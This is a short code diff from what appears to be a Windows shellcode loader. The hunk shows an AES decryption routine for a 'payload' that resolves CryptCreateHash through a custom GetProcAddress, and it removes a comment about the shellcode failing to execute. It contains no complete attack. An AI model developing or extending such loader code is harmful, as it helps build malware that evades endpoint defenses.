@@ -50,7 +50,6 @@ int AESDecrypt(char * payload, unsigned int payloadLen, char * key, unsigned int
         return -1;
     }
 
-    // The shellcode does not get executed if this function is resolved. No idea Why !!
     CryptCreateHash_DT pCryptCreateHash = (CryptCreateHash_DT) CustomGetProcAddress(hdAdvapi32, (char*) "CryptCreateHash");
     if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
         return -1;
